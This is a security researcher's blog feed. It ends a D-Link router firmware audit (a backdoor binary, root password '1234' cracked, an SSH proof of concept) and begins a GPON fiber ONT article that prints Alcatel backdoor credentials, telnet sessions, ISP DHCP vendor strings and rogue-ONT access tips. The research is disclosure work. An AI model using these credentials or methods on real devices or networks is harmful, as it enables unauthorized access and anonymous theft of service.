lrwxrwxrwx  1 root root     8 Jul 18  2014 stop-bootlogd -&gt; bootlogd
lrwxrwxrwx  1 root root    14 Jul 18  2014 syslog -&gt; syslog.busybox
drwxr-xr-x 31 root root  1680 Jul 18  2014 ..
-rwxr-xr-x  1 root root  2681 Oct 11 02:33 dropbear
drwxr-xr-x  2 root root  1180 Oct 11 02:33 .
root@kali:~/output/2#
</code></pre>
<p>Backdoor is still started at boot (same SHA256):</p>
<pre><code>root@kali:~/output/2# ls -latr ./etc/init.d/start_appmgr
-rwxr-xr-x 1 root root 2178 Jul 18  2014 ./etc/init.d/start_appmgr
root@kali:~/output/2# ls -latr bin/appmgr
-rwxr-xr-x 1 root root 505728 Jul 18  2014 bin/appmgr
root@kali:~/output/2# sha256sum bin/appmgr
5f1647729327423f525de194322d532acae86d7f4265dc886535fe1252cb4f20 bin/appmgr
root@kali:~/output/2# strings bin/appmgr|grep -i DBG
am_comdbg
HELODBG
BYEDBG
[DBG] Read content &lt;%s&gt; from file...
/var/lte6dbg.log
/var/bgdbg.log
/config/dbglog_ipt6
/var/cmdbg.log
root@kali:~/output/2#
</code></pre>
<p><strong>Wow a patch ! Dropbear will listen to port 999999999/tcp (are you sure you want to do this because 999999999 &amp; 0xFFFF = 51711 ?)</strong></p>
<pre><code>root@kali:~/output/2# head -n 30 etc/init.d/dropbear 
#!/bin/sh
### BEGIN INIT INFO
# Provides:             sshd
# Required-Start:       $remote_fs $syslog $networking
# Required-Stop:        $remote_fs $syslog
# Default-Start:        2 3 4 5
# Default-Stop:         1
# Short-Description:    Dropbear Secure Shell server
### END INIT INFO
#
# Do not configure this file. Edit /etc/default/dropbear instead!
#

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/dropbear
NAME=dropbear
DESC="Dropbear SSH server"

DROPBEAR_PORT=999999999
DROPBEAR_EXTRA_ARGS=
NO_START=0

set -e

test ! -r /etc/default/dropbear || . /etc/default/dropbear
test "$NO_START" = "0" || exit 0
test -x "$DAEMON" || exit 0
test ! -h /var/service/dropbear || exit 0

readonly_rootfs=0
root@kali:~/output/2#
</code></pre>
<p>Still the same passwords (<code>root / 1234</code>):</p>
<pre><code>root@kali:~/output/2# john etc/shadow  
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (root)
1g 0:00:00:00 100% 2/3 12.50g/s 25162p/s 25162c/s 25162C/s 123456..marley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre>
<p>Now with <code>mdm-image-mdm9625.yaffs2</code> (this appears to be a "test image", without the dropbear tweak):</p>
<pre><code>root@kali:~/output/2# cd .. &amp;&amp; mkdir 3 &amp;&amp; cd 3 &amp;&amp; unyaffs ../mdm-image-mdm9625.yaffs2
</code></pre>
<p>Backdoor is still started at boot (same SHA256):</p>
<pre><code>root@kali:~/output/3# ls -latr ./etc/init.d/start_appmgr
-rwxr-xr-x 1 root root 2178 Jul 18  2014 ./etc/init.d/start_appmgr
root@kali:~/output/3# ls -latr bin/appmgr
-rwxr-xr-x 1 root root 505728 Jul 18  2014 bin/appmgr
root@kali:~/output/3# sha256sum bin/appmgr
5f1647729327423f525de194322d532acae86d7f4265dc886535fe1252cb4f20  bin/appmgr
root@kali:~/output/3# strings bin/appmgr|grep -i DBG
am_comdbg
HELODBG
BYEDBG
[DBG] Read content &lt;%s&gt; from file...
/var/lte6dbg.log
/var/bgdbg.log
/config/dbglog_ipt6
/var/cmdbg.log
root@kali:~/output/3#
</code></pre>
<p>Wow, the final patch! Dropbear is now listening to port 47980/tcp.</p>
<pre><code>root@kali:~/output/3# ls -latr etc/init.d|tail
-rwxr-xr-x  1 root root  2015 Jul 18  2014 reboot
-rwxr-xr-x  1 root root 10835 Jul 18  2014 power_config
-rwxr-xr-x  1 root root  2138 Jul 18  2014 start_ipacm_le
-rwxr-xr-x  1 root root   609 Jul 18  2014 run-postinsts
-rwxr-xr-x  1 root root  2178 Jul 18  2014 start_appmgr
lrwxrwxrwx  1 root root     8 Jul 18  2014 stop-bootlogd -&gt; bootlogd
lrwxrwxrwx  1 root root    14 Jul 18  2014 syslog -&gt; syslog.busybox
drwxr-xr-x 31 root root  4096 Jul 18  2014 ..
-rwxr-xr-x  1 root root  2677 Oct 10 23:11 dropbear
drwxr-xr-x  2 root root  4096 Oct 10 23:11 .
root@kali:~/output/3# head -n 30 etc/init.d/dropbear
#!/bin/sh
### BEGIN INIT INFO
# Provides:   sshd
# Required-Start: $remote_fs $syslog $networking
# Required-Stop:  $remote_fs $syslog
# Default-Start:  2 3 4 5
# Default-Stop:   1
# Short-Description:  Dropbear Secure Shell server
### END INIT INFO
#
# Do not configure this file. Edit /etc/default/dropbear instead!
#

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/dropbear
NAME=dropbear
DESC="Dropbear SSH server"

DROPBEAR_PORT=47980
DROPBEAR_EXTRA_ARGS=
NO_START=0

set -e

test ! -r /etc/default/dropbear || . /etc/default/dropbear
test "$NO_START" = "0" || exit 0
test -x "$DAEMON" || exit 0
test ! -h /var/service/dropbear || exit 0

readonly_rootfs=0
</code></pre>
<p><strong>It took 5 months for D-Link to produce these security patches. It appears only 1 vulnerability was patched.</strong></p>
<h2>Diff between 2.02 version (vulnerable) and 2.03 version ("patched"):</h2>
<pre><code>root@kali:~# diff 202/2K/etc/init.d/dropbear 203/2K/etc/init.d/dropbear
19c19
&lt; DROPBEAR_PORT=22
---
&gt; DROPBEAR_PORT=999999999
root@kali:~#
</code></pre>
<p>And:</p>
<pre><code>&gt; /sbin/xxlnetd
&lt; /sbin/telnetd
</code></pre>
<p>And finally:</p>
<pre><code>root@kali:~# diff 202/usr/etc/versions 203/usr/etc/init.d/dropbear
&lt; fw_version=02.02EU
---
&gt; fw_version=02.03EU
7c7
&lt; model_name=beUT9Z
---
&gt; model_name=beUT9Z#
root@kali:~#
</code></pre>
<p>And the final PoC:</p>
<pre><code>root@kali:~# ssh -l root -p 51711 192.168.1.1
The authenticity of host '[192.168.1.1]:51711 ([192.168.1.1]:51711)' can't be established.
RSA key fingerprint is SHA256:0RCgva9fjvPn6TkN89hkVQHIpHkKfvfsGmYtnOgki0g.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.1.1]:51711' (RSA) to the list of known hosts.
root@192.168.1.1's password: 
root@homerouter:~# ps -a|grep dropbear
  352 root       0:00 /usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 999999999
 1190 root       0:00 /usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 999999999
 1203 root       0:00 grep dropbear
root@homerouter:~# netstat -antelapu|grep drop
tcp        0      0 0.0.0.0:51711           0.0.0.0:*               LISTEN      318/dropbear
tcp        0      0 192.168.1.1:51711       192.168.1.2:44924       ESTABLISHED 1061/dropbear
tcp        0      0 :::51711                :::*                    LISTEN      318/dropbear
root@homerouter:~#
</code></pre>
<p>Then, the DBG backdoor can be reactivated by an attacker just by adding a symlink from <code>/sbin/telnetd</code> to <code>/sbin/busybox</code>.</p></content>
    </entry>
    
    <entry>
        <title>GPON FTTH networks (in)security</title>
        <link href="2016-11-01-gpon-ftth-networks-insecurity.html"/>
        <content type="html"><h2>Table of contents</h2>
<p>&nbsp;<a href="#introduction">1. Introduction</a><br>
&nbsp;<a href="#explanation-of-gpon-networks">2. Explanation of GPON networks</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#gpon-networks">2.1. GPON Network</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#ont-used-in-this-research">2.2. ONT/ONU used in this research</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#ont-authentication">2.3. ONT Authentication</a><br>
&nbsp;<a href="#studying-the-onts">3. Studying the ONTs</a><br>
&nbsp;<a href="#internet-connection">4. Internet Authentication</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#sfr">4.1. SFR</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#orange">4.2. Orange</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bouygues">4.3. Bouygues FTTH</a><br>
&nbsp;<a href="#security-threat-against-the-gpon-ftth-model">5. Security Threat against the GPON FTTH model</a><br>
&nbsp;<a href="#physical-security">6. Physical Security</a><br>
&nbsp;<a href="#hacking-the-ont">7. Powning the ONT</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#rce">7.1. Remote Code execution</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#analysing-the-ont">7.2. Analysing the ONT</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#backdoor-credentials-in-etc-passwd">7.3. Backdoor credentials in /etc/passwd*</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#backdoor-accountd-in-http">7.4. Backdoor accounts in the HTTP configuration files</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#bad-unix-rights">7.5. Bad UNIX RIGHTS and UID/GID everywhere</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#same-ssh-keys">7.6. Same SSH keys used in all the firmware</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#re-alcatel">7.7. Reverse-engineering - introducing Alcatel binaries</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#re-backdoor">7.8. Reverse-engineering - Strange binary</a><br>
&nbsp;<a href="#bruteforce">8. Bruteforce</a><br>
&nbsp;<a href="#conclusion">9. Conclusion</a><br>
&nbsp;<a href="#report-timeline">10. Report Timeline</a><br>
&nbsp;<a href="#credits">11. Credits and Greetings</a><br>
&nbsp;<a href="#license">12. License</a><br></p>
<p><a id="introduction"></a></p>
<h2>1. Introduction</h2>
<p><strong>GPON FTTH network</strong> is the future: GPON FTTH (Fiber To The Home) is very popular because it is cheap and allows people to download <em>legal Video On Demand</em> damn fast.  Everybody wants GPON FTTH at home, you, me, my dog and my neighbors. In fact, you are sharing 2.5gbps of downstream with others clients (but it is still fast).</p>
<p>This article will present FTTH GPON (in)security, based on attacks against IoT. It's mainly written against GPON networks in France and will focus on Alcatel Lucent GPON networks (Orange, Bouygues and SFR). Free FTTH network (point to point network) is out of scope in this research.</p>
<p>This is the first public article about (in)security of FTTH GPON networks. It will contain RCE against <code>ONT/ONU</code> (the device located in your house which is connected to the fiber optic) and tips how to potentially get an anonymous 1gbps Internet connection in France. The legal implication of this research is interesting: <strong>When FTTH connections are involved, the IP used as evidence may not be identifiable any more thus questions its legitimate value.</strong></p>
<p>Telecom Italia did a great presentation about <a href="http://docbox.etsi.org/Workshop/2009/200901_SECURITYWORKSHOP/TELECOMITALIA_DELUTIIS_NextGenerationAccessNetwork(in)Security.pdf">theoretical GPON security</a> in 2009, but there are not a lot of documentations about the security of GPON FTTH networks apart from this presentation. Please note there may have some facts that still need to be clarified in this research (but all the major facts were confirmed by a major French ISP).</p>
<p><strong>This research was mainly done in 2013-2014 but was kept private. It was done for educational purpose in order to understand how GPON FTTH works.</strong></p>
<p><strong>Legal Note: these tests were done using my FTTH connections at home. Yes, you can have up to 4 FTTH connections working at the same time with same or different ISPs in France. Orange was contacted 6 months ago (May 11, 2016) about these vulnerabilities.</strong></p>
<p>You can find FTTH GPON networks in other countries too, e.g. South Korea.</p>
<p><a id="explanation-of-gpon-networks"></a></p>
<h2>2. Explanation of GPON networks</h2>
<p>A GPON network is a passive optical network featuring <strong>one-to-multipoint architecture</strong>.</p>
<p>It consists of Optical Line Terminal (<code>OLT</code>), Passive Optical Splitter and Optical Network Unit (Optical Network Transceiver, <code>ONU/ONT</code>). The fiber optic strands are shared among multiple clients: splitters are used to separate and aggregate the optical signal.</p>
<ul>
<li><code>GPON</code> is the acronym for Gigabit-capable Passive Optical Networks</li>
<li><code>OLT</code> is the acronym for Optical Line Terminal.</li>
<li><code>ONU</code> is the acronym for Optical Network Unit. - multiple clients</li>
<li><code>ONT</code> is the acronym for Optical Network Transceiver or Optical Network Terminal - single clients</li>
<li><code>SLID</code> is the acronym for Subscriber Line IDentifier.</li>
<li><code>POS</code> is the acronym for Passive Optical Splitter.</li>
</ul>
<p>A GPON network allows multiple ISP. In France, Orange, SFR and Bouygues Telecom are using the same GPON FTTH networks.</p>
<p><a id="gpon-networks"></a></p>
<h3>2.1. GPON Network</h3>
<p><img alt="" src="images/2016-ftth-article1-pon-wikipedia.png" /></p>
<blockquote>
<p>-- <a href="https://commons.wikimedia.org/wiki/File:PON_vs_AON.png">https://commons.wikimedia.org/wiki/File:PON_vs_AON.png</a></p>
</blockquote>
<p>The <code>ONU</code> is hosted at home, and it encodes and receives the signal for the fiber. It's basically a blackbox.
We can name the <code>ONU</code> an <code>ONT</code> (Optical Network Transceiver) because it translates the signals present in the fiber (light) into electrical signals (RJ45), and vice versa.</p>
<p><a href="http://www.slideshare.net/mansoor_gr8/gpon-fundamentals">From a Huawei presentation</a>:
<img alt="" src="images/2016-ftth-article1-gpon-fundamentals-upstream.jpg" /></p>
<p>They are connected in the underground to a large passive splitter. This splitter doesn't have physical security protection (we will speak about this point later).</p>
<p><img alt="" src="images/2016-ftth-article1-fibre_sfr-12-622x436.jpg" /></p>
<blockquote>
<p>--  Photo from <a href="http://www.degroupnews.com/dossier/sfr-pose-la-fibre-optique-dans-un-appartement">http://www.degroupnews.com/dossier/sfr-pose-la-fibre-optique-dans-un-appartement</a></p>
</blockquote>
<p>Transmission of data:</p>
<p>According to the specification, transmitting upstream is in cleartext.</p>
<p>The downstream can be <em>optionally</em> encrypted using AES-128. It depends on the ISP.</p>
<p>From a <a href="http://www.slideshare.net/mansoor_gr8/gpon-fundamentals">Huawei presentation</a>:
<img alt="" src="images/2016-ftth-article1-gpon-fundamentals-aes.jpg" /></p>
<p><a id="ont-used-in-this-research"></a></p>
<h3>2.2. ONT/ONU used in this research</h3>
<p><img alt="" src="images/2016-ftth-article1-ont1.jpg" /></p>
<p>From left to right:</p>
<ul>
<li><code>ONT</code> currently provided by SFR France: Alcatel I-020G-F.</li>
<li>Second <code>ONT</code> provided by Orange France since 2014: Alcatel I-010G-A.</li>
<li>First <code>ONT</code> provided by Orange France in 2013: Alcatel I-010G-A.</li>
</ul>
<p><img alt="" src="images/2016-ftth-article1-ont2.jpg" /></p>
<p>From left to right:</p>
<ul>
<li>Back of the first <code>ONT</code> provided by Orange France in 2013.</li>
<li>Back of the second <code>ONT</code> provided by Orange France since 2014.</li>
<li>Back of the <code>ONT</code> currently provided by SFR France.</li>
</ul>
<p>The fiber is linked to a remote <code>OLT</code> managed by the ISP, as shown in the network diagram. The RJ45 port is normally linked to a proprietary triple-play box (or a linux/*BSD router).</p>
<p>The <code>ONT</code> provided by SFR has 2 gigabit RJ45 connectors. Only the port 1 seems to be usable.</p>
<p>The 3 <code>ONT</code> are Alcatel-Lucent products. They seem to share the same vulnerabilities.</p>
<p><a id="ont-authentication"></a></p>
<h3>2.3. ONT Authentication</h3>
<p>G.984.3 defines two authentication mechanisms:</p>
<ul>
<li>pre-provision of the <code>ONU/ONT</code> to an <code>OLT</code>, using a shared <code>SLID</code> (Subscriber Line IDentifier)</li>
<li>the <code>SLID</code> is unknown and the <code>OLT</code> activates the <code>ONT/ONU</code> on the fly.</li>
</ul>
<p>There is no verification of the remote <code>OLT</code>, so authentication with a rogue remote OLT is possible, allowing wiretapping. This is another subject.</p>
<p>The <code>SLID</code> can be in different modes:</p>
<ul>
<li><code>PERMANENT</code></li>
<li><code>VOLATILE</code></li>
<li><code>REGISTRATION</code></li>
</ul>
<p>The <code>SLID</code> can be saved in two formats: hexadecimal or alphanumeric.</p>
<p>From my research, the <code>SLID</code> for a SFR connection is <code>VOLATILE</code> and is not set to a fixed value: the <code>OLT</code> activates the <code>ONT</code> on the fly.</p>
<p>The <code>SLID</code> for an Orange connection is <code>PERMANENT</code> and is a shared secret between the <code>ONU/ONT</code> and the <code>OLT</code>. The SLID is entered into the <code>ONT</code> by a technician when he comes to your home to install the fiber.
The authentication is based on this value. Changing the <code>SLID</code> to an incorrect value will interrupt the connection of the ONT to the remote <code>OLT</code>, which means NO INTERNET.</p>
<p>The <code>SLIDs</code> that were linked to my Orange FTTH accounts were (obfuscated, with 0 for numbers and X for letters):</p>
<ul>
<li>0W1JXXXX   &lt;- it looked like a random string (alphanumeric)</li>
<li>0562100000 &lt;- it looked like a French phone number</li>
</ul>
<p><a id="studying-the-onts"></a></p>
<h2>3. Studying the ONTs</h2>
<p><code>ONT</code> is our heaven's gate. Controlling <code>ONT</code> will give us a lot of possibilities.</p>
<p>You need to be on the same subnet to access to <code>ONT</code>:</p>
<pre><code>user@kali:~$ sudo ifconfig eth0 192.168.4.1 netmask 255.255.255.0
</code></pre>
<p>Nmap against the device:</p>
<pre><code>user@kali:~$ sudo nmap -sS -sV -v -O -n 192.168.4.254

Starting Nmap 4.37 ( http://nmap.org ) at 2014-02-03 12:54 EDT
NSE: Loaded 29 scripts for scanning.
Initiating ARP Ping Scan at 12:54
Scanning 192.168.4.254 [1 port]
Completed ARP Ping Scan at 12:54, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:54
Scanning 192.168.4.254 [1000 ports]
Discovered open port 23/tcp on 192.168.4.254
Discovered open port 22/tcp on 192.168.4.254
Discovered open port 80/tcp on 192.168.4.254
[...]
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
23/tcp open  telnet     Linux telnetd
80/tcp open  http       BusyBox httpd
MAC Address: AC:9C:E4:AA:AA:AA (Alcatel-Lucent Shanghai Bell Co.)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.47%E=4%D=6/30%OT=22%CT=1%CU=36398%PV=Y%DS=1%DC=D%G=Y%M=AC9CE4%T
OS:M=5592C9CF%P=x86_64-unknown-linux-gnu)SEQ(SP=CE%GCD=1%ISR=D0%TI=Z%CI=Z%I
OS:I=I%TS=8)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW
OS:0%O5=M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0
OS:%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B
OS:4ST11NW0%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.001 days (since Tue Feb 03 12:52:52 2014)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=206 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; Device: media device; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>The daemon on port 22 doesn't want to speak to my telnet client :(</p>
<pre><code>user@kali:~$ telnet 192.168.4.254 22
Trying 192.168.4.254...
Connected to 192.168.4.254.
Escape character is '^]'.
PATATE

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>From my research, an ONT has two remote panels:</p>
<ul>
<li>a HTTP webpage (http://192.168.4.254/)</li>
<li>a telnet account (telnet://192.168.4.254)</li>
</ul>
<p>There is a documented backdoor account in the busybox mailing list (2009, <a href="http://lists.busybox.net/pipermail/busybox/2009-July/070031.html">http://lists.busybox.net/pipermail/busybox/2009-July/070031.html</a> written by an Alcatel employee). This is a limited account, allowing only to change small things in the device:</p>
<pre><code>login: CRAFTSPERSON (was "CRAFT" at first, from the mailing list post)
password: ALC#FGU
</code></pre>
<p>This is the account used by technicians to configure the <code>ONT</code> during the FTTH installation and is widely known.</p>
<p>The backdoor account can be found too using the NeufBox configuration API</p>
<pre><code>user@kali:~$ wget 'http://ncdn.nb4dsl.neufbox.neuf.fr/nb6_Version%203.3.9/NB6-CONFIG-R3.3.9.2'
</code></pre>
<p>This file contains the credentials for the ONT:</p>
<pre><code>    &lt;/plc&gt;
    &lt;ont&gt;
            &lt;active&gt;on&lt;/active&gt;
            &lt;mode&gt;ondemand&lt;/mode&gt;
            &lt;ip&gt;192.168.4.254&lt;/ip&gt;
            &lt;userI010&gt;admin4me&lt;/userI010&gt;
            &lt;passwordI010&gt;connect4you@support&lt;/passwordI010&gt;
            &lt;defslidI010&gt;1111111111&lt;/defslidI010&gt;
            &lt;userI020&gt;CRAFTSPERSON&lt;/userI020&gt;
            &lt;passwordI020&gt;ALC#FGU&lt;/passwordI020&gt;
            &lt;defslidI020&gt;DEFAULT&lt;/defslidI020&gt;
            &lt;delay&gt;
                    &lt;system&gt;600&lt;/system&gt;
                    &lt;webui&gt;300&lt;/webui&gt;
            &lt;/delay&gt;
            &lt;debug&gt;off&lt;/debug&gt;
    &lt;/ont&gt;
</code></pre>
<p>Administration webpage (in Flash) using the credentials:</p>
<p><img alt="" src="images/2016-ftth-article1-ont-remote-www.png" /></p>
<p>Login to the first Orange ONT using the backdoor account will provide a restricted shell.</p>
<pre><code>user@kali:~$ telnet 192.168.2.254
Trying 192.168.4.254...
Connected to 192.168.4.254.
Escape character is '^]'.

MontaVista(R) Linux(R) Professional Edition 3.1
Linux/ppc 2.4.20_mvl31-gponsoc


(none) login: CRAFTSPERSON
Password:


MontaVista(R) Linux(R) Professional Edition 3.1



===============================================================
                   Craft user Login                            
===============================================================




   Main Menu
   ===============

     1. Enter SLID in volatile mode  
     2. Enter SLID in permanent mode (non-volatile)  
     3. Enter SLID in registration mode (non-volatile)  
     4. Retrieve SLID    
     5. Clear SLID       
     6. Retrieve ranging state   
     7. Retrieve optical level   
     8. More options       
     9. Logout

     Enter choice : 4
The SLID in ALPHANUMERIC MODE (Volatile) : DEFAULT


   Main Menu
   ===============

     1. Enter SLID in volatile mode  
     2. Enter SLID in permanent mode (non-volatile)  
     3. Enter SLID in registration mode (non-volatile)  
     4. Retrieve SLID    
     5. Clear SLID       
     6. Retrieve ranging state   
     7. Retrieve optical level   
     8. More options       
     9. Logout

     Enter choice : 6
Ranging State = Initial State (Auto-Disable State = Normal State)
press enter key to continue...


   Main Menu
   ===============

     1. Enter SLID in volatile mode  
     2. Enter SLID in permanent mode (non-volatile)  
     3. Enter SLID in registration mode (non-volatile)  
     4. Retrieve SLID    
     5. Clear SLID       
     6. Retrieve ranging state   
     7. Retrieve optical level   
     8. More options       
     9. Logout

     Enter choice : 7
ponOpticalSignalLevel =  -50.00 dBm
press enter key to continue...

   Main Menu
   ===============

     1. Enter SLID in volatile mode  
     2. Enter SLID in permanent mode (non-volatile)  
     3. Enter SLID in registration mode (non-volatile)  
     4. Retrieve SLID    
     5. Clear SLID       
     6. Retrieve ranging state   
     7. Retrieve optical level   
     8. More options       
     9. Logout

     Enter choice : 8
Additional menu items are not available, press enter key to continue...
</code></pre>
<p>This account can only configure options relative to the <code>SLID</code> and can show the <code>SLID</code> and the fiber optical signal level.</p>
<p><a id="internet-connection"></a></p>
<h2>4. Internet Authentication</h2>
<p>When you connect the fiber to the <code>ONT</code>, then the <code>ONT</code> to the proprietary box (router), you need to understand how the proprietary box gets an Internet connection:</p>
<pre><code>(Internet) ---Fiber--- [ONT] ---RJ45--- [Router provided by the ISP]
                                            |                |
                                           RJ45             Wifi
                                            |                |
                                        [Computer 1]    [Computer 2]
</code></pre>
<p>By using a Linux/BSD computer instead of the provided router:</p>
<pre><code>(Internet) ---Fiber--- [ONT] ---RJ45--- [Linux Computer]
</code></pre>
<p><a id="sfr"></a></p>
<h3>4.1. SFR</h3>
<p>When using SFR, there is no Internet Authentication.</p>
<p>Assuming you are sending the correct vendor string in the DHCP request:</p>
<pre><code>send dhcp-class-identifier "neufbox5_NB5-SER-r1_ND5-MAIN-R2.2.2";
</code></pre>
<p>Typing <code>dhclient eth0</code> in your Linux laptop, connected to the ONT, will give you a public IP on your eth0 interface.</p>
<p><a id="orange"></a></p>
<h3>4.2. Orange</h3>
<p>When using Orange, the situation is MUCH more complicated. There is a complicated authentication for accounting.</p>
<p>You have to do PPPoE authentication over VLAN835. In my view, PPPoE is used because of legacy reason (compatibility with RTC and ADSL authentication servers).
835 seems to be a tribute to the <code>8/35 VCI/VPI</code> (Virtual Path Identifier, Virtual Circuit Identifier) used in ADSL connection with ATM encapsulation. Others VLANs are used (for voice and for TVs but it's out of scope).</p>
<p>An OpenBSD configuration is:</p>
<pre><code># cat /etc/hostname.if0
up
# cat /etc/hostname.vlan835
vlan 835 vlandev if0 up
# cat /etc/hostname.pppoe0
inet 0.0.0.0 255.255.255.255 NONE \
    ppppoedev vlan835 authproto chap \
    authname 'fti/XXXXXXX' authkey 'XXXXXXX'
    up
dest 0.0.0.1
!/sbin/route add default ifp pppoe0 0.0.0.1
#
</code></pre>
<p>A Linux configuration is more complex (from <a href="https://benjamin.sonntag.fr/spip.php?page=forum&amp;id_article=43&amp;id_forum=60&amp;lang=fr">https://benjamin.sonntag.fr/spip.php?page=forum&amp;id_article=43&amp;id_forum=60&amp;lang=fr</a>):</p>
<pre><code>$ cat /etc/network/interfaces
auto eth0 eth0.835 ppp0
iface eth0 inet manual
iface eth0.835 inet manual
iface ppp0 inet ppp
   provider ft_fibre


$ cat/etc/ppp/peers/ft_fibre
pty "/usr/sbin/pppoe -I eth0.835 -T 80 -m 1452"
noipdefault
hide-password
lcp-echo-interval 20
lcp-echo-failure 3
connect /bin/true
noauth
persist
mtu 1492
usepeerdns
defaultroute
noaccomp
default-asyncmap
plugin rp-pppoe.so eth0.835
user "fti/XXXXXXX"

$ cat /etc/ppp/chap-secrets:
"fti/XXXXXXX"   *    "XXXXXXX"
</code></pre>
<p>Note that when you are using an Orange connection, you are directly authenticated on the orange website (www.orange.fr), based on your IP. You can manage the connection, read the emails, evil stuff ...</p>
<p>From my research, you need valid PPPoE FTTH credentials. ADSL and RTC credentials don't work.</p>
<p>Breaking news: it appears Orange is starting to replace PPPoE authentication with DHCP (without authentication) since november 2015. This needs to be confirmed but <a href="https://lafibre.info/orange-les-news/livebox-en-dhcp/">several</a> <a href="https://blog.jbfavre.org/2016/01/25/Remplacer-livebox-orange-configuration-routeur-mikrotik/">sources</a> use DHCP to get a working IPv4.</p>
<p><a id="bouygues"></a></p>
<h3>4.3. Bouygues FTTH</h3>
<p>When using Bouygues, there is no Internet Authentication.</p>
<p>Bouygues uses DHCP over VLAN200.</p>
<p>Assuming you are sending the correct vendor string in the DHCP request with the MAC address of the provided router:</p>
<pre><code>send vendor-class-identifier "byteliad_data";
</code></pre>
<p>Typing <code>dhclient eth0.200</code> in your Linux laptop, connected to the ONT, will give you a public IP on your eth0.200 interface.</p>
<p><a id="security-threat-against-the-gpon-ftth-model"></a></p>
<h2>5. Security Threat against the GPON FTTH model</h2>
<p>From <a href="http://docbox.etsi.org/Workshop/2009/200901_SECURITYWORKSHOP/TELECOMITALIA_DELUTIIS_NextGenerationAccessNetwork(in)Security.pdf">telecomitalia_delutiis_nextgenerationaccessnetwork(in)security.pdf</a>:</p>
<p>The security mechanisms already defined are based on <strong>the assumption that all the GPON
elements will be strongly physically protected</strong>. GPON communication are vulnerable to
severe security issues, such as:</p>
<blockquote>
<p>Fake/Forged OLT: currently no OLT identification and authentication mechanisms have been specified</p>
<p>Man In The Middle (MITM) attacks</p>
<pre><code>     Passive attacks: password and keys sent as cleartext

     Active attack: sensitive PLOAM messages are not authenticated (e.g. PASSWORD, encryption KEY)
</code></pre>
<p>Several kinds of DOS (Denial of Service) at GPON level e.g. during the activation phases.</p>
<p>-- <a href="http://docbox.etsi.org/Workshop/2009/200901_SECURITYWORKSHOP/TELECOMITALIA_DELUTIIS_NextGenerationAccessNetwork(in)Security.pdf">telecomitalia_delutiis_nextgenerationaccessnetwork(in)security.pdf</a></p>
</blockquote>
<p><a id="physical-security"></a></p>
<h2>6. Physical Security</h2>
<p>From what we know now, an attacker can easily go in the basement of buildings and connect rogue <code>ONTs</code> to the splitter by disconnecting legitimate clients. <strong>It appears all the GPON elements are not strongly physically protected and having access to elements is trivial</strong>.</p>
<p>Photos from <a href="http://www.degroupnews.com/dossier/sfr-pose-la-fibre-optique-dans-un-appartement">http://www.degroupnews.com/dossier/sfr-pose-la-fibre-optique-dans-un-appartement</a>:</p>
<p><img alt="" src="images/2016-ftth-article1-fibre_sfr-19-622x357.jpg" /></p>
<p><img alt="" src="images/2016-ftth-article1-fibre_sfr-12-622x436.jpg" /></p>
<p>If they are SFR clients, just connecting an <code>ONT</code> configured in a <code>VOLATILE</code> mode will give, in theory, an attacker an anonymous high speed (1gpbs) Internet Access with a public IP address.</p>
<p>If they are Bouygues clients, just connecting an <code>ONT</code> configured in a <code>VOLATILE</code> mode will give, in theory, an attacker an anonymous high speed (1gpbs) Internet Access with a public IP address.</p>
